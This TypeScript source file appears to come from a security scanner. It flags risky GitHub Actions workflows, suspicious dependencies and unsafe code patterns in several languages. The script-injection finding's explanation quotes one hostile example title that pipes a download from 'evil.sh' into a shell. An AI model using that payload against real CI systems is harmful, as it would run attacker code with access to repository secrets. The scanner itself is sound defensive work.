import { finding } from "../../runner/finding.js";
import type { Finding, Severity } from "../../types.js";
import type { EngineAgent } from "../types.js";
import { TEST_PATH, type CodeContext, type SourceFile } from "./context.js";

/**
 * Supply chain depth and more languages for the source code check:
 * - GitHub Actions, in the way zizmor reads them: actions not pinned to a commit, pull_request_target
 *   that checks out the pull request's code, untrusted event text pasted into run scripts, write-all
 *   tokens, and self-hosted runners on public pull requests.
 * - Packages: install scripts in dependencies, names one letter away from popular packages
 *   (typosquats), dependencies from Git or plain http, and no lockfile.
 * - SAST rules for Dart/Flutter, PHP, Python, Go, Kotlin/Java and Swift that the main rule set does
 *   not cover (the way Bandit, gosec and FindSecBugs flag them).
 */

type CodeAgent = EngineAgent<CodeContext>;
const base = { engine: "code" as const, products: ["code" as const] };
const lineOf = (text: string, index: number) => text.slice(0, index).split("\n").length;

interface Hit {
  rule: string;
  severity: Severity;
  title: string;
  detail: string;
  where: string;
}

const group = (hits: Hit[]): Finding[] => {
  const by = new Map<string, Hit & { all: string[] }>();
  for (const h of hits) {
    const g = by.get(h.rule) ?? { ...h, all: [] };
    if (!g.all.includes(h.where)) g.all.push(h.where);
    by.set(h.rule, g);
  }
  return [...by.values()].map((g) => finding({ category: "security", rule: g.rule, severity: g.severity, title: g.title, detail: g.detail, pageUrl: g.all[0].replace(/:\d+$/, ""), evidence: g.all.slice(0, 10).join("\n") + (g.all.length > 10 ? `\n…and ${g.all.length - 10} more` : ""), count: g.all.length }));
};

/** Problems in one GitHub Actions workflow. Pure, for tests. */
export function workflowProblems(path: string, text: string): Hit[] {
  const out: Hit[] = [];
  for (const m of text.matchAll(/^\s*-?\s*uses:\s*["']?([\w.-]+\/[\w./-]+)@([\w.-]+)["']?/gm)) {
    const [, action, ref] = m;
    if (/^(actions|github)\//.test(action)) continue; // GitHub's own actions are lower risk
    if (!/^[0-9a-f]{40}$/.test(ref))
      out.push({ rule: "ci:action-not-pinned", severity: "medium", title: "A third-party GitHub Action is not pinned to a commit", detail: "A tag like @v3 can be moved by whoever controls the action (tj-actions/changed-files, March 2025, leaked secrets of 23,000 repos this way). Pin each third-party action to its full commit SHA (uses: owner/action@<40-char sha> # v3) and let Dependabot update it.", where: `${path}:${lineOf(text, m.index!)} ${action}@${ref}` });
  }
  if (/\bpull_request_target\b/.test(text) && /ref:\s*\$\{\{\s*github\.event\.pull_request\.head\.(sha|ref)/.test(text))
    out.push({ rule: "ci:pwn-request", severity: "critical", title: "pull_request_target checks out the pull request's code", detail: "This workflow runs with the repository's secrets and write token, and checks out code from a stranger's pull request: anyone can open a pull request that steals the secrets or pushes to the repository (a \"pwn request\"). Use pull_request instead, or never check out or run the PR's code in pull_request_target.", where: path });
  for (const m of text.matchAll(/\$\{\{\s*(github\.event\.(issue\.title|issue\.body|pull_request\.title|pull_request\.body|comment\.body|review\.body|head_commit\.message|pull_request\.head\.ref|pull_request\.head\.label)|github\.head_ref)\s*\}\}/g)) {
    const before = text.slice(0, m.index);
    const runLine = before.lastIndexOf("run:");
    const usesLine = before.lastIndexOf("uses:");
    if (runLine > usesLine)
      out.push({ rule: "ci:script-injection", severity: "high", title: "Text from issues or pull requests is pasted into a CI script", detail: "${{ github.event... }} is replaced before the shell runs, so a pull request titled `\"; curl evil.sh | sh #` runs that command in CI. Pass the value through an environment variable (env: TITLE: ${{ github.event.pull_request.title }}, then \"$TITLE\").", where: `${path}:${lineOf(text, m.index!)} ${m[1]}` });
  }
  if (/^permissions:\s*write-all/m.test(text)) out.push({ rule: "ci:write-all", severity: "medium", title: "A workflow gives its token write access to everything", detail: "permissions: write-all lets any step (and any compromised action) push code and change releases. Set permissions: contents: read at the top and grant more per job.", where: path });
  if (/runs-on:\s*\[?\s*self-hosted/.test(text) && /\bpull_request\b/.test(text)) out.push({ rule: "ci:self-hosted-pr", severity: "medium", title: "Pull requests run on a self-hosted runner", detail: "Code from a pull request runs on GLV's or the client's own machine. In a public repository anyone can run code there. Use GitHub-hosted runners for pull requests, or require approval for outside contributors.", where: path });
  return out;
}

/** Popular package names, for the typosquat check. */
export const POPULAR = ["react", "react-dom", "express", "lodash", "axios", "moment", "request", "chalk", "commander", "debug", "dotenv", "webpack", "typescript", "vue", "next", "jquery", "mongoose", "socket.io", "body-parser", "cors", "jsonwebtoken", "bcrypt", "uuid", "yargs", "eslint", "prettier", "nodemon", "redux", "rxjs", "underscore", "async", "bluebird", "colors", "electron", "puppeteer", "playwright", "requests", "numpy", "pandas", "django", "flask", "urllib3", "boto3", "pillow", "cryptography", "selenium", "beautifulsoup4", "setuptools", "laravel/framework", "guzzlehttp/guzzle", "monolog/monolog", "http", "provider", "dio", "firebase_core", "shared_preferences"];

/** Edit distance 1 (one letter added, removed, changed or two swapped). Pure, for tests. */
export function oneAway(a: string, b: string): boolean {
  if (a === b || Math.abs(a.length - b.length) > 1) return false;
  if (a.length === b.length) {
    const diff = [...a].map((c, i) => (c !== b[i] ? i : -1)).filter((i) => i >= 0);
    return diff.length === 1 || (diff.length === 2 && diff[1] === diff[0] + 1 && a[diff[0]] === b[diff[1]] && a[diff[1]] === b[diff[0]]);
  }
  const [s, l] = a.length < b.length ? [a, b] : [b, a];
  for (let i = 0; i < l.length; i++) if (l.slice(0, i) + l.slice(i + 1) === s) return true;
  return false;
}

/** Dependency problems in a manifest or lockfile. Pure, for tests. */
export function packageProblems(file: SourceFile): Hit[] {
  const out: Hit[] = [];
  const name = file.path.split("/").pop() ?? "";
  const deps: string[] = [];
  if (name === "package.json") {
    try {
      const pkg = JSON.parse(file.text) as Record<string, Record<string, string> | undefined>;
      for (const k of ["dependencies", "devDependencies", "optionalDependencies"]) {
        for (const [dep, spec] of Object.entries(pkg[k] ?? {})) {
          deps.push(dep);
          if (/^(git(\+\w+)?:|github:|https?:\/\/(?!registry\.npmjs\.org))/.test(spec) || /^[\w-]+\/[\w.-]+(#.*)?$/.test(spec))
            out.push({ rule: "deps:from-git-or-url", severity: "medium", title: "A dependency comes from Git or a web address, not the registry", detail: "It is not checked by the registry, has no fixed version and can change under you. Publish it to the registry (or a private one) and pin a version.", where: `${file.path} ${dep}: ${spec}` });
          if (spec.startsWith("http://")) out.push({ rule: "deps:plain-http", severity: "high", title: "A dependency is downloaded over plain http", detail: "Anyone on the network path can swap it. Use https.", where: `${file.path} ${dep}: ${spec}` });
          if (spec === "*" || spec === "latest" || spec === "") out.push({ rule: "deps:any-version", severity: "medium", title: "A dependency accepts any version", detail: 'A version of "*" or "latest" installs whatever is newest, including a hijacked release. Pin a range like ^1.2.3 and commit the lockfile.', where: `${file.path} ${dep}: ${spec || "(empty)"}` });
        }
      }
    } catch {
      return out;
    }
  } else if (name === "package-lock.json") {
    try {
      const lock = JSON.parse(file.text) as { packages?: Record<string, { hasInstallScript?: boolean; dev?: boolean; resolved?: string }> };
      for (const [p, info] of Object.entries(lock.packages ?? {})) {
        if (!p) continue;
        const dep = p.replace(/^.*node_modules\//, "");
        if (info.hasInstallScript && !/^(esbuild|@esbuild\/|sharp|bcrypt|node-sass|sqlite3|better-sqlite3|fsevents|core-js|husky|protobufjs|@swc\/|puppeteer|playwright|electron|canvas|node-gyp|cypress|msw|nx|@parcel\/watcher|unrs-resolver)/.test(dep))
          out.push({ rule: "deps:install-script", severity: "low", title: "Dependencies run their own scripts when installed", detail: "These packages run code on every npm install (on developers' machines and CI). Most are fine, but this is how poisoned packages steal keys. Review them, and install with --ignore-scripts where the build allows.", where: `${file.path} ${dep}` });
        if (info.resolved?.startsWith("http://")) out.push({ rule: "deps:plain-http", severity: "high", title: "A dependency is downloaded over plain http", detail: "Anyone on the network path can swap it. Use https registries only.", where: `${file.path} ${dep}` });
      }
    } catch {
      return out;
    }
  } else if (/^requirements.*\.txt$/.test(name)) {
    for (const line of file.text.split("\n")) {
      const dep = line.trim().split(/[<>=!~;[\s]/)[0];
      if (dep && !dep.startsWith("#") && !dep.startsWith("-")) deps.push(dep.toLowerCase());
      if (/^(git\+|https?:)/.test(line.trim())) out.push({ rule: "deps:from-git-or-url", severity: "medium", title: "A dependency comes from Git or a web address, not the registry", detail: "Pin to a released version on PyPI, or a commit hash with --require-hashes.", where: `${file.path} ${line.trim().slice(0, 80)}` });
    }
  } else if (name === "pubspec.yaml") {
    for (const m of file.text.matchAll(/^ {2}([a-z_][a-z0-9_]*):/gm)) deps.push(m[1]);
  }
  for (const d of deps) {
    const near = POPULAR.find((p) => oneAway(d.toLowerCase(), p));
    if (near && !POPULAR.includes(d.toLowerCase()))
      out.push({ rule: "deps:typosquat", severity: "high", title: "A dependency's name is one letter away from a popular package", detail: `"${d}" looks like "${near}". Attackers publish look-alike names that steal keys when installed. Check it is really the package you meant; if not, remove it and rotate any keys on machines that installed it.`, where: `${file.path} ${d} (like ${near})` });
  }
  return out;
}

/** Extra SAST rules by language: [file pattern, regex, rule, severity, title, detail]. */
export const SAST_RULES: [RegExp, RegExp, string, Severity, string, string][] = [
  // Dart / Flutter
  [/\.dart$/, /badCertificateCallback\s*=\s*\([^)]*\)\s*=>\s*true/, "sast:dart-trust-all-certs", "critical", "Flutter app accepts any HTTPS certificate", "badCertificateCallback returning true lets anyone on the network read and change the app's traffic. Remove it (use a proper certificate, or pin it)."],
  [/\.dart$/, /SharedPreferences[\s\S]{0,200}\.(setString|setStringList)\(\s*['"][^'"]*(token|password|secret|pin|otp)/i, "sast:dart-plain-storage", "high", "Flutter app keeps a token or password in SharedPreferences", "SharedPreferences is a plain file. Use flutter_secure_storage (Keychain / Keystore) for tokens and passwords."],
  [/\.dart$/, /\bprint\(\s*[^)]*(token|password|otp|secret)/i, "sast:dart-logs-secret", "medium", "Flutter app prints a token or password", "print() output is readable in device logs. Remove it, or log through a logger that is off in release."],
  [/\.dart$/, /Uri\.parse\(\s*['"]http:\/\/(?!localhost|10\.0\.2\.2|127\.)/, "sast:dart-http", "medium", "Flutter app calls a plain http address", "Use https so the traffic cannot be read or changed."],
  [/\.dart$/, /WebView[\s\S]{0,300}javascriptMode:\s*JavascriptMode\.unrestricted[\s\S]{0,300}(addJavascriptChannel|javascriptChannels)/, "sast:dart-webview-bridge", "medium", "Flutter WebView gives pages a JavaScript bridge", "Any page the WebView opens can call the app's channels. Load only your own pages in it and check message origins."],
  // PHP
  [/\.php$/, /\b(unserialize)\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)/, "sast:php-unserialize", "critical", "PHP unserializes data from the request", "unserialize() of user data lets attackers build objects that run code (PHP object injection). Use json_decode instead."],
  [/\.php$/, /\b(include|require)(_once)?\s*\(?\s*\$_(GET|POST|REQUEST|COOKIE)/, "sast:php-file-include", "critical", "PHP includes a file named by the request", "include of a user-chosen path runs any file (local and remote file inclusion). Map allowed names to fixed files."],
  [/\.php$/, /\bextract\s*\(\s*\$_(GET|POST|REQUEST)/, "sast:php-extract", "high", "PHP extract() of request data", "extract() lets the request overwrite any variable (like $is_admin). Read the fields you need by name."],
  [/\.php$/, /\bmd5\s*\(\s*\$_(POST|GET|REQUEST)\[['"]pass/, "sast:php-md5-password", "high", "Passwords hashed with md5", "md5 hashes are cracked in seconds. Use password_hash() and password_verify()."],
  [/\.php$/, /\$wpdb->(query|get_results|get_row|get_var)\s*\(\s*["'][^"']*\$/, "sast:php-wpdb-sql", "high", "WordPress query built from variables", "Use $wpdb->prepare() with placeholders so input cannot change the SQL."],
  // Python (Bandit-style)
  [/\.py$/, /\byaml\.load\s*\((?![^)]*Loader\s*=\s*(yaml\.)?SafeLoader)/, "sast:py-yaml-load", "high", "Python yaml.load without SafeLoader", "yaml.load can build any Python object from the file. Use yaml.safe_load (Bandit B506)."],
  [/\.py$/, /\bpickle\.loads?\s*\(/, "sast:py-pickle", "high", "Python unpickles data", "pickle runs code while loading. Never unpickle data from users or the network; use JSON (Bandit B301)."],
  [/\.py$/, /subprocess\.\w+\([^)]*shell\s*=\s*True/, "sast:py-shell-true", "high", "Python runs a shell command with shell=True", "With shell=True, input in the command can run other commands. Pass a list of arguments and shell=False (Bandit B602)."],
  [/\.py$/, /\brequests\.(get|post|put|delete|patch)\([^)]*verify\s*=\s*False/, "sast:py-no-verify", "high", "Python requests with certificate checks off", "verify=False lets anyone in the middle read the traffic (Bandit B501)."],
  [/\.py$/, /app\.run\([^)]*debug\s*=\s*True/, "sast:py-flask-debug", "critical", "Flask runs with debug on", "The debug console runs any Python code for whoever reaches it. Never set debug=True outside a developer's machine (Bandit B201)."],
  [/\.py$/, /\bhashlib\.(md5|sha1)\s*\([^)]*pass/i, "sast:py-weak-password-hash", "high", "Passwords hashed with md5 or sha1", "Use bcrypt, scrypt or argon2 (passlib, or Django's own hashers)."],
  // Go (gosec-style)
  [/\.go$/, /InsecureSkipVerify:\s*true/, "sast:go-skip-verify", "high", "Go TLS with certificate checks off", "InsecureSkipVerify: true accepts any certificate (gosec G402)."],
  [/\.go$/, /exec\.Command\(\s*"(sh|bash|cmd)"\s*,\s*"-c"/, "sast:go-shell", "high", "Go runs a command through a shell", "Input in the string can run other commands (gosec G204). Call the program directly with separate arguments."],
  [/\.go$/, /\bmath\/rand\b[\s\S]{0,2000}(token|secret|password|otp|nonce)/i, "sast:go-weak-random", "medium", "Go uses math/rand near secrets", "math/rand is predictable. Use crypto/rand for tokens and codes (gosec G404)."],
  [/\.go$/, /http\.ListenAndServe\(/, "sast:go-no-timeouts", "low", "Go HTTP server without timeouts", "http.ListenAndServe has no read or write timeouts, so slow clients can tie up the server (gosec G114). Use an http.Server with ReadHeaderTimeout."],
  // Kotlin / Java (FindSecBugs-style)
  [/\.(kt|java)$/, /setJavaScriptEnabled\(true\)[\s\S]{0,400}addJavascriptInterface/, "sast:android-js-bridge", "high", "Android WebView exposes app code to JavaScript", "Any page loaded in the WebView can call the interface. Load only your own pages, and mark only needed methods @JavascriptInterface."],
  [/\.(kt|java)$/, /Cipher\.getInstance\(\s*"(AES|DES)(\/ECB[^"]*)?"\s*\)/, "sast:jvm-ecb", "high", "Encryption in ECB mode", "ECB shows patterns in the data. Use AES/GCM/NoPadding with a random IV."],
  [/\.(kt|java)$/, /MessageDigest\.getInstance\(\s*"(MD5|SHA-?1)"\s*\)/, "sast:jvm-weak-hash", "medium", "MD5 or SHA-1 hash", "Use SHA-256 for integrity and bcrypt/Argon2 for passwords."],
  [/\.(kt|java)$/, /new\s+ObjectInputStream\(|ObjectInputStream\(/, "sast:jvm-deserialize", "high", "Java deserialization", "ObjectInputStream.readObject on untrusted data runs code (gadget chains). Use JSON, or an allow-list ObjectInputFilter."],
  // Swift
  [/\.swift$/, /UserDefaults\.standard\.set\([^)]*,\s*forKey:\s*"[^"]*(token|password|secret|pin)/i, "sast:swift-userdefaults-secret", "high", "iOS app keeps a token or password in UserDefaults", "UserDefaults is a plain file in the app's folder. Use the Keychain."],
  [/\.swift$/, /NSAllowsArbitraryLoads|\.allowsArbitraryLoads|serverTrust[\s\S]{0,200}completionHandler\(\.useCredential/, "sast:swift-trust-all", "high", "iOS app accepts any server certificate", "Trusting every certificate lets anyone in the middle read the traffic. Remove it, or pin the real certificate."],
  [/\.swift$/, /\bprint\([^)]*(token|password|otp)/i, "sast:swift-logs-secret", "medium", "iOS app prints a token or password", "print output reaches device logs. Remove it, or use os_log with private."],
];

export const codeSupplyChainAgent: CodeAgent = {
  ...base,
  id: "code.supply-chain",
  name: "Supply chain and CI",
  description: "GitHub Actions the way zizmor reads them (unpinned third-party actions, pull_request_target running PR code, script injection, write-all tokens), and dependencies: install scripts, look-alike (typosquat) names, packages from Git or plain http, any-version ranges.",
  category: "security",
  run({ files, allPaths, note }) {
    const hits: Hit[] = [];
    for (const f of files) {
      if (/^\.github\/workflows\/[^/]+\.ya?ml$/.test(f.path)) hits.push(...workflowProblems(f.path, f.text));
      if (/(^|\/)(package\.json|package-lock\.json|requirements[^/]*\.txt|pubspec\.yaml)$/.test(f.path) && !/node_modules\//.test(f.path)) hits.push(...packageProblems(f));
    }
    const hasPkg = allPaths.some((p) => /(^|\/)package\.json$/.test(p) && !/node_modules/.test(p));
    const hasLock = allPaths.some((p) => /(^|\/)(package-lock\.json|yarn\.lock|pnpm-lock\.yaml|bun\.lockb?)$/.test(p));
    if (hasPkg && !hasLock) hits.push({ rule: "deps:no-lockfile", severity: "medium", title: "No lockfile is committed", detail: "Without package-lock.json (or yarn/pnpm lock), every install can pick up newer, possibly hijacked versions. Commit the lockfile and install with npm ci.", where: "package.json" });
    note(`Supply chain: ${files.filter((f) => f.path.startsWith(".github/workflows/")).length} workflows, ${files.filter((f) => /package(-lock)?\.json$|requirements.*\.txt$|pubspec\.yaml$/.test(f.path)).length} dependency files read`);
    return group(hits);
  },
};

export const codeSastMoreAgent: CodeAgent = {
  ...base,
  id: "code.sast-languages",
  name: "Security rules for Flutter, PHP, Python, Go, Kotlin/Java and Swift",
  description: "Rules in the way of Bandit (Python), gosec (Go), FindSecBugs (Java/Kotlin) and mobile checks for Dart/Flutter and Swift: trust-all certificates, secrets in plain storage or logs, unsafe deserialization, shell commands, weak hashes, PHP file inclusion and WordPress SQL.",
  category: "security",
  run({ files, note }) {
    const hits: Hit[] = [];
    let read = 0;
    for (const f of files) {
      if (TEST_PATH.test(f.path) || /(^|\/)(vendor|node_modules|build|\.dart_tool|Pods)\//.test(f.path)) continue;
      const rules = SAST_RULES.filter(([p]) => p.test(f.path));
      if (!rules.length) continue;
      read++;
      for (const [, re, rule, severity, title, detail] of rules) {
        const m = re.exec(f.text);
        if (m) hits.push({ rule, severity, title, detail, where: `${f.path}:${lineOf(f.text, m.index)}` });
      }
    }
    note(`Extra language rules: ${read} files`);
    return group(hits);
  },
};
